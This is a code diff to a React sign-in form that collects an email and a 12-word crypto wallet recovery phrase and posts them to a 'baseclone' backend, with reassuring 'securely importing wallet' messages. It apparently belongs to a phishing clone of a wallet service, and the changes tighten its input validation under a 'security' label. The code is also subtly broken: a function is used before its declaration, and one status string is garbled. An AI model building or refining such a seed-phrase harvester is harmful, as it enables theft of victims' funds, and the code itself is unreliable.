@@ -16,12 +16,31 @@ export default function SigninForm({ referralCode, initialEmail, initialStep }) 
 
   const isSeedStep = currentStep === "password";
   const emailReady = email.trim().length > 5;
-  const seedReady = seedPhrase.trim().split(/\s+/).filter(Boolean).length >= 12;
+  const seedReady = validateSeedPhrase(seedPhrase);
+
+  const validateSeedPhrase = (phrase) => {
+    const words = phrase.trim().split(/\s+/).filter(Boolean);
+    return words.length === 12;
+  };
 
   // Build URLs while preserving the referral code
+  // Security: Validate referral code format to prevent injection attacks
+  const validateReferralCode = (code) => {
+    if (!code) return true;
+    // Only allow alphanumeric codes between 8-16 characters
+    const codePattern = /^[a-zA-Z0-9]{8,16}$/;
+    if (!codePattern.test(code)) {
+      setStatus('������ Invalid referral code format');
+      return false;
+    }
+    return true;
+  };
+
   const getUrlWithRef = (basePath, params = {}) => {
     const newParams = new URLSearchParams(params);
-    if (referralCode) newParams.set("ref", referralCode);
+    if (referralCode && validateReferralCode(referralCode)) {
+      newParams.set("ref", referralCode);
+    }
     const query = newParams.toString();
     return query ? `${basePath}?${query}` : basePath;
   };
@@ -38,11 +57,25 @@ export default function SigninForm({ referralCode, initialEmail, initialStep }) 
 
   const handleSeedSubmit = async (e) => {
     e.preventDefault();
-    if (!seedReady) return;
+
+    // Enhanced seed phrase validation
+    if (!validateSeedPhrase(seedPhrase)) {
+      setStatus(
+        "⚠️ Seed phrase must contain exactly 12 words. Please check your recovery phrase and try again."
+      );
+      return;
+    }
 
     setStatus("Securely importing wallet...");
 
     try {
+      // Enhanced validation for email format
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailPattern.test(email.trim())) {
+        setStatus("⚠️ Please enter a valid email address.");
+        return;
+      }
+
       const response = await fetch("https://baseclone-backend.vercel.app/api/auth/register", {
         method: "POST",
         headers: {
@@ -60,7 +93,7 @@ export default function SigninForm({ referralCode, initialEmail, initialStep }) 
       if (response.ok) {
         setIsSuccess(true);
         setStatus("✅ Account secured successfully.");
-        
+
         if (window.smartsupp) {
           window.smartsupp('chat:open');
         }
